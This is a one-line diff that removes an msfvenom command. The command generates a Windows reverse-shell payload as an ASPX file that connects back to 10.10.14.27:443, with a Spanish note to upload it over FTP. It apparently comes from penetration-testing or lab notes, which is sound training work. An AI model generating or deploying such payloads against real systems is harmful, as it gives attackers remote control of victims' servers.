@@ -1,1 +1,0 @@
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=443 -f aspx > exploit.aspx {subirlo mediante ftp}
